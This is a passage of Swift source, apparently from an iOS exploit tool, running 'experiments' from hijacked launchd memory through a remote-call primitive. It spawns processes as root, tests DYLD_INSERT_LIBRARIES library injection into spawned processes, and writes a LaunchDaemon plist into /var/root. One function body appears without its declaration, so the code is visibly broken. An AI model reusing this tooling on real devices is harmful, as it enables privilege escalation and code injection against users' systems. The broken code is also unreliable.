    /// Strategy: fork() → child inherits launchd's state → 
    /// use posix_spawn in CHILD context (child is trusted like launchd)
    /// OR: directly call execve() which replaces child with target binary
    private func expForkAndConnect(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Strategy A: fork + posix_spawn in same call sequence
        // After fork(), parent gets child PID, child gets 0
        // But in RC context, we're always in parent...
        
        // Strategy B: Use vfork() — child shares address space with parent
        // until exec. This means we can set up execve args BEFORE vfork,
        // and child will use them!
        
        // Strategy C: fork + immediately execve via kernel manipulation
        // We can find the child's thread in kernel and set its PC to execve
        
        // Let's try Strategy B: vfork + execve
        // vfork() is special: child shares parent's memory until exec
        // So if we setup args at known address, child can use them
        
        // First: setup execve arguments in trojanMem
        let binPath = "/bin/df"
        let binAddr = remote_alloc_str(rc, binPath)
        let argvBase = mem + 0x500
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0) // NULL terminator
        
        // Setup output redirect: open file for stdout before fork
        let outFile = "/tmp/.dsp_fork_exec_out"
        let outAddr = remote_alloc_str(rc, outFile)
        RootExecutor.rcall(rc, "unlink", outAddr)
        let outFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        
        // dup2(outFd, 1) — redirect stdout to file BEFORE fork
        // Child will inherit this fd
        // BUT we don't want to mess up launchd's stdout permanently
        // Save original stdout first
        let origStdout = RootExecutor.rcall(rc, "dup", 1)
        RootExecutor.rcall(rc, "dup2", outFd, 1) // stdout → file
        RootExecutor.rcall(rc, "dup2", outFd, 2) // stderr → file
        
        // Now fork — child inherits redirected stdout
        let childPid = RootExecutor.rcall(rc, "fork")
        
        // Restore parent's stdout immediately
        RootExecutor.rcall(rc, "dup2", origStdout, 1)
        RootExecutor.rcall(rc, "dup2", origStdout, 2)
        RootExecutor.rcall(rc, "close", origStdout)
        RootExecutor.rcall(rc, "close", outFd)
        
        var detail = "fork() = \(childPid)\n"
        
        if childPid == 0 {
            // We're in child (shouldn't happen in RC)
            detail += "Unexpected: in child context\n"
        } else if childPid == UInt64(bitPattern: -1) {
            detail += "fork failed!\n"
        } else {
            detail += "Child PID = \(childPid)\n"
            
            // Wait for child to finish (it should exit quickly since
            // it's a copy of our thread that will hit the RC return trap)
            RootExecutor.rcall(rc, "usleep", 500000) // 0.5s
            
            let statusAddr = mem + 0x380
            rc[statusAddr].setValue32(0)
            let waitRet = RootExecutor.rcall(rc, "waitpid", childPid, statusAddr, UInt64(WNOHANG))
            let status = rc[statusAddr].value32()
            detail += "waitpid: ret=\(waitRet), status=0x\(String(format: "%x", status))\n"
            
            // Now try: posix_spawn with stdout already redirected to file
            // This is different from before — we redirect BEFORE spawn
            let pidAddr2 = mem + 0x2E0
            rc[pidAddr2].setValue64(0)
            
            // Open output file again for new spawn
            let outFd2 = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
            
            // Setup file actions
            let actionsAddr = mem + 0x100
            rc[actionsAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
            // dup2 outFd2 to stdout in child
            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", actionsAddr, outFd2, 1)
            RootExecutor.rcall(rc, "posix_spawn_file_actions_adddup2", actionsAddr, outFd2, 2)
            
            let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr2, binAddr, actionsAddr, 0, argvBase, 0)
            let spawnPid = rc[pidAddr2].value32()
            detail += "\nposix_spawn(/bin/df) with dup2 actions:\n"
            detail += "  ret=\(spawnRet), pid=\(spawnPid)\n"
            
            RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
            
            if spawnRet == 0 {
                // Wait for spawned process
                RootExecutor.rcall(rc, "usleep", 1000000) // 1s
                RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
            }
            
            RootExecutor.rcall(rc, "close", outFd2)
            
            // Read output
            let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
            if readFd != UInt64(bitPattern: -1) {
                let bufAddr = mem + 0x800
                let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
                if n > 0 && n < 2001 {
                    var buf = [UInt8](repeating: 0, count: Int(n))
                    rc.remoteRead(bufAddr, to: &buf, size: n)
                    let output = String(bytes: buf, encoding: .utf8) ?? "(binary)"
                    detail += "\nOUTPUT (\(n) bytes):\n\(output.prefix(400))"
                } else {
                    detail += "\nNo output (n=\(n))"
                }
                RootExecutor.rcall(rc, "close", readFd)
            }
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        
        let hasOutput = detail.contains("OUTPUT")
        return ExperimentResult(
            name: "fork + dup2 + spawn",
            success: hasOutput,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Test: can we use ldid/codesign-style ad-hoc signing?
    /// Write binary with valid Mach-O structure + ad-hoc signature
    private func expAdHocSign(rc: RemoteCall) -> ExperimentResult {
        // Replaced by expDYLDInsert, expLaunchdXPCSpawn, expSpawnWithEnv
        return ExperimentResult(name: "ad-hoc (replaced)", success: false, detail: "See experiments 30-32", timestamp: Date())
    }
    
    /// RELIABLE spawn — isolated test with extra debugging
    /// Reproduces exact pattern that gave 1795 chars from /bin/df
    private func expReliableSpawn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Use DIFFERENT memory offsets from other experiments to avoid collision
        let outFile = "/tmp/.dsp_reliable_out"
        let outAddr = remote_alloc_str(rc, outFile)
        
        // Step 1: Delete old file
        RootExecutor.rcall(rc, "unlink", outAddr)
        
        // Step 2: Init file actions at DIFFERENT offset
        let actionsAddr = mem + 0x1800 // far from other experiments
        rc[actionsAddr].setValue64(0)
        rc[actionsAddr + 8].setValue64(0)
        rc[actionsAddr + 16].setValue64(0)
        let initRet = RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
        
        // Step 3: addopen stdout
        let addRet1 = RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        // addopen stderr
        let addRet2 = RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen",
                          actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
        
        // Step 4: Setup argv at different offset
        let binAddr = remote_alloc_str(rc, "/bin/df")
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0) // NULL
        
        // Step 5: Spawn
        let pidAddr = mem + 0x1A00
        rc[pidAddr].setValue64(0xAAAA) // sentinel
        let spawnRet = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, 0)
        let pidAfter = rc[pidAddr].value32()
        
        // Step 6: LONG wait (2 seconds)
        RootExecutor.rcall(rc, "usleep", 2000000)
        
        // Step 7: waitpid(-1) to reap ANY child
        let statusAddr = mem + 0x1B00
        rc[statusAddr].setValue32(0)
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        let waitStatus = rc[statusAddr].value32()
        
        // Step 8: Check if output file exists and has content
        let statAddr = mem + 0x1D00
        let statRet = RootExecutor.rcall(rc, "stat", outAddr, statAddr)
        
        // Step 9: Read output
        var output = ""
        var fileSize: UInt64 = 0
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        if readFd != UInt64(bitPattern: -1) {
            // Get file size via lseek
            fileSize = RootExecutor.rcall(rc, "lseek", readFd, 0, 2) // SEEK_END
            RootExecutor.rcall(rc, "lseek", readFd, 0, 0) // SEEK_SET
            
            let bufAddr = mem + 0x1E00
            let toRead = min(fileSize, 2000)
            if toRead > 0 {
                let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, toRead)
                if n > 0 && n <= toRead {
                    var buf = [UInt8](repeating: 0, count: Int(n))
                    rc.remoteRead(bufAddr, to: &buf, size: n)
                    output = String(bytes: buf, encoding: .utf8) ?? "(binary \(n)B)"
                }
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        file_actions_init: \(initRet)
        addopen(stdout): \(addRet1)
        addopen(stderr): \(addRet2)
        posix_spawn: ret=\(spawnRet), pid_sentinel=0x\(String(format: "%x", pidAfter))
        usleep(2s): done
        waitpid(-1): ret=\(waitRet), status=0x\(String(format: "%x", waitStatus))
        stat(outfile): \(statRet == 0 ? "EXISTS" : "MISSING")
        file size: \(fileSize)
        output (\(output.count) chars):
        \(output.prefix(500))
        """
        
        return ExperimentResult(
            name: "reliable spawn /bin/df",
            success: !output.isEmpty,
            detail: detail,
            timestamp: Date()
        )
    }
    
    /// Call launchd's internal job submission
    /// We ARE running inside launchd — we can call its own APIs!
    private func expLaunchdJobSubmit(rc: RemoteCall) -> ExperimentResult {
        // launchd uses xpc internally. Key functions:
        // - xpc_dictionary_create
        // - xpc_dictionary_set_string
        // - job_new / job_dispatch
        
        // Simpler approach: use launch_data API (older but might work)
        // launch_data_new_string, launch_data_dict_insert, launch_msg
        
        // Actually simplest: just try posix_spawn with NULL file_actions
        // but with proper posix_spawnattr that sets process group
        // This isolates the spawn from launchd's own process group
        
        let mem = rc.trojanMem
        
        // Try: spawn /sbin/mount (known to exist) with NO file actions
        // Just check if it actually runs (creates a process)
        let binAddr = remote_alloc_str(rc, "/sbin/mount")
        let argvBase = mem + 0x1C00
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // Use posix_spawnattr with SETPGROUP
        let attrAddr = mem + 0x1800
        rc[attrAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
        // POSIX_SPAWN_SETPGROUP = 0x0002
        // POSIX_SPAWN_SETSID = 0x0400 (new session)
        RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, 0x0402) // SETPGROUP | SETSID
        RootExecutor.rcall(rc, "posix_spawnattr_setpgroup", attrAddr, 0) // new pgroup
        
        let pidAddr = mem + 0x1A00
        rc[pidAddr].setValue64(0xBBBB)
        
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, attrAddr, argvBase, 0)
        let pidVal = rc[pidAddr].value32()
        
        // Wait
        RootExecutor.rcall(rc, "usleep", 1000000)
        let statusAddr = mem + 0x1B00
        let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
        
        RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        
        let detail = """
        posix_spawn(/sbin/mount, attr=[SETPGROUP|SETSID], no file_actions):
        ret=\(ret), pid=0x\(String(format: "%x", pidVal))
        waitpid(-1): \(waitRet)
        
        If waitpid returns real PID → process actually spawned!
        SETSID creates new session — might bypass some restrictions
        """
        
        return ExperimentResult(name: "spawn + SETSID", success: waitRet > 0 && waitRet != UInt64(bitPattern: -1), detail: detail, timestamp: Date())
    }
    
    /// Test various posix_spawn flags
    private func expSpawnFlags(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let binAddr = remote_alloc_str(rc, "/bin/df")
        var results: [String] = []
        
        // Test different flag combinations
        let flagSets: [(String, UInt64)] = [
            ("no flags", 0),
            ("SETPGROUP", 0x0002),
            ("SETSID", 0x0400),
            ("CLOEXEC_DEFAULT", 0x1000),
            ("SETPGROUP|SETSID", 0x0402),
            ("all safe flags", 0x1402),
        ]
        
        for (name, flags) in flagSets {
            let attrAddr = mem + 0x1800
            rc[attrAddr].setValue64(0)
            RootExecutor.rcall(rc, "posix_spawnattr_init", attrAddr)
            if flags != 0 {
                RootExecutor.rcall(rc, "posix_spawnattr_setflags", attrAddr, flags)
            }
            
            let argvBase = mem + 0x1C00
            rc[argvBase].setValue64(binAddr)
            rc[argvBase + 8].setValue64(0)
            
            let pidAddr = mem + 0x1A00
            rc[pidAddr].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, flags == 0 ? 0 : attrAddr, 0, argvBase, 0)
            
            // Quick wait
            RootExecutor.rcall(rc, "usleep", 300000) // 0.3s
            let statusAddr = mem + 0x1B00
            let waitRet = RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), statusAddr, UInt64(WNOHANG))
            
            results.append("\(name): ret=\(ret), wait=\(waitRet)")
            
            RootExecutor.rcall(rc, "posix_spawnattr_destroy", attrAddr)
        }
        
        RootExecutor.rcall(rc, "free", binAddr)
        
        let anyWaited = results.contains(where: { $0.contains("wait=") && !$0.contains("wait=0") && !$0.contains("wait=18446") })
        
        return ExperimentResult(
            name: "spawn flag variants",
            success: anyWaited,
            detail: results.joined(separator: "\n"),
            timestamp: Date()
        )
    }
        let mem = rc.trojanMem
        let outFile = "/tmp/.dsp_dyld_test"
        let outAddr = remote_alloc_str(rc, outFile)
        RootExecutor.rcall(rc, "unlink", outAddr)
        
        // Setup file actions for output
        let actionsAddr = mem + 0x100
        rc[actionsAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
        
        // Binary
        let binAddr = remote_alloc_str(rc, "/bin/df")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(binAddr)
        rc[argvBase + 8].setValue64(0)
        
        // Environment with DYLD_INSERT_LIBRARIES
        // Point to a SIGNED system dylib (to test if DYLD_INSERT works at all)
        let envBase = mem + 0x480
        let dyldEnv = remote_alloc_str(rc, "DYLD_INSERT_LIBRARIES=/usr/lib/libSystem.B.dylib")
        let dyldPrint = remote_alloc_str(rc, "DYLD_PRINT_LIBRARIES=1")
        rc[envBase].setValue64(dyldEnv)
        rc[envBase + 8].setValue64(dyldPrint)
        rc[envBase + 16].setValue64(0) // NULL
        
        // Spawn with environment
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, envBase)
        let pid = rc[pidAddr].value32()
        
        // Wait
        RootExecutor.rcall(rc, "usleep", 1000000)
        RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        
        // Read output
        var output = ""
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? ""
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        RootExecutor.rcall(rc, "free", dyldEnv)
        RootExecutor.rcall(rc, "free", dyldPrint)
        
        let hasDyldOutput = output.contains("dyld") || output.contains("/usr/lib")
        let detail = """
        posix_spawn(/bin/df, env=[DYLD_INSERT, DYLD_PRINT]): ret=\(ret), pid=\(pid)
        output (\(output.count) chars):
        \(output.prefix(400))
        
        If DYLD_PRINT shows loaded libs → DYLD_INSERT works!
        → Can inject signed dylib into any spawned process!
        """
        
        return ExperimentResult(name: "DYLD_INSERT_LIBRARIES", success: ret == 0 && !output.isEmpty, detail: detail, timestamp: Date())
    }
    
    /// Use launchd's internal spawn mechanism via xpc/launchctl
    /// launchd spawns daemons all the time — can we make it spawn OUR binary?
    private func expLaunchdXPCSpawn(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        
        // Write a LaunchDaemon plist that points to /bin/df
        // Then try to load it via launchd's internal API
        let plist = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>com.dsploit.test.spawn</string>
            <key>ProgramArguments</key>
            <array>
                <string>/bin/df</string>
                <string>-h</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>StandardOutPath</key>
            <string>/tmp/.dsp_launchd_spawn_out</string>
            <key>StandardErrorPath</key>
            <string>/tmp/.dsp_launchd_spawn_out</string>
        </dict>
        </plist>
        """
        
        // Write plist
        let plistPath = "/var/root/.dsp_test_daemon.plist"
        let plistAddr = remote_alloc_str(rc, plistPath)
        let fd = RootExecutor.rcall(rc, "open", plistAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        if fd != UInt64(bitPattern: -1) {
            let contentAddr = remote_alloc_str(rc, plist)
            RootExecutor.rcall(rc, "write", fd, contentAddr, UInt64(plist.utf8.count))
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "free", contentAddr)
        }
        
        // Try to load via launch_data API or xpc
        // launchd has internal function: launch_data_new_string, launch_msg
        // Or simpler: just check if the plist is valid and launchd can read it
        
        // Actually — we're IN launchd! We can call its internal submit function!
        // job_submit() or runtime_add_job()
        // But these are private symbols...
        
        // Alternative: use xpc_connection to com.apple.launchd
        // and send a "load" message
        
        // For now: check if output file gets created (meaning launchd spawned it)
        RootExecutor.rcall(rc, "usleep", 2000000) // 2s wait
        
        let outPath = remote_alloc_str(rc, "/tmp/.dsp_launchd_spawn_out")
        let outFd = RootExecutor.rcall(rc, "open", outPath, UInt64(O_RDONLY), 0)
        var output = ""
        if outFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", outFd, bufAddr, 2000)
            if n > 0 && n < 2001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? ""
            }
            RootExecutor.rcall(rc, "close", outFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", plistAddr)
        RootExecutor.rcall(rc, "unlink", outPath)
        RootExecutor.rcall(rc, "free", plistAddr)
        RootExecutor.rcall(rc, "free", outPath)
        
        let detail = """
        Wrote LaunchDaemon plist to \(plistPath)
        Program: /bin/df -h
        StandardOutPath: /tmp/.dsp_launchd_spawn_out
        
        Output file: \(outFd != UInt64(bitPattern: -1) ? "EXISTS (\(output.count) chars)" : "NOT CREATED")
        \(output.isEmpty ? "(launchd didn't spawn — need to call load API)" : "OUTPUT:\n\(output.prefix(300))")
        
        Next: call launchd's internal job_submit/load API
        """
        
        return ExperimentResult(name: "launchd plist spawn", success: !output.isEmpty, detail: detail, timestamp: Date())
    }
    
    /// posix_spawn with full environment (envp) — test DYLD variables
    private func expSpawnWithEnv(rc: RemoteCall) -> ExperimentResult {
        let mem = rc.trojanMem
        let outFile = "/tmp/.dsp_env_test"
        let outAddr = remote_alloc_str(rc, outFile)
        RootExecutor.rcall(rc, "unlink", outAddr)
        
        // File actions
        let actionsAddr = mem + 0x100
        rc[actionsAddr].setValue64(0)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_init", actionsAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 1, outAddr, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_addopen", actionsAddr, 2, outAddr, UInt64(O_WRONLY | O_CREAT), 0o644)
        
        // Use /bin/ps this time (different binary)
        let binAddr = remote_alloc_str(rc, "/bin/ps")
        let argAddr = remote_alloc_str(rc, "ps")
        let argvBase = mem + 0x400
        rc[argvBase].setValue64(argAddr)
        rc[argvBase + 8].setValue64(0)
        
        // Minimal environment
        let envBase = mem + 0x480
        let pathEnv = remote_alloc_str(rc, "PATH=/sbin:/usr/sbin:/bin:/usr/bin")
        let homeEnv = remote_alloc_str(rc, "HOME=/var/root")
        rc[envBase].setValue64(pathEnv)
        rc[envBase + 8].setValue64(homeEnv)
        rc[envBase + 16].setValue64(0)
        
        // Spawn
        let pidAddr = mem + 0x2E0
        rc[pidAddr].setValue64(0)
        let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, actionsAddr, 0, argvBase, envBase)
        
        // Wait
        RootExecutor.rcall(rc, "usleep", 1000000)
        RootExecutor.rcall(rc, "waitpid", UInt64(bitPattern: -1), mem + 0x380, UInt64(WNOHANG))
        
        // Read
        var output = ""
        let readFd = RootExecutor.rcall(rc, "open", outAddr, UInt64(O_RDONLY), 0)
        if readFd != UInt64(bitPattern: -1) {
            let bufAddr = mem + 0x800
            let n = RootExecutor.rcall(rc, "read", readFd, bufAddr, 3000)
            if n > 0 && n < 3001 {
                var buf = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buf, size: n)
                output = String(bytes: buf, encoding: .utf8) ?? ""
            }
            RootExecutor.rcall(rc, "close", readFd)
        }
        
        // Cleanup
        RootExecutor.rcall(rc, "unlink", outAddr)
        RootExecutor.rcall(rc, "posix_spawn_file_actions_destroy", actionsAddr)
        RootExecutor.rcall(rc, "free", outAddr)
        RootExecutor.rcall(rc, "free", binAddr)
        RootExecutor.rcall(rc, "free", argAddr)
        RootExecutor.rcall(rc, "free", pathEnv)
        RootExecutor.rcall(rc, "free", homeEnv)
        
        let detail = """
        posix_spawn(/bin/ps, env=[PATH, HOME]): ret=\(ret)
        output (\(output.count) chars):
        \(output.prefix(500))
        
        If output shows process list → /bin/ps works with env!
        """
        
        return ExperimentResult(name: "spawn /bin/ps + env", success: ret == 0 && !output.isEmpty, detail: detail, timestamp: Date())
    }
    #endif
}
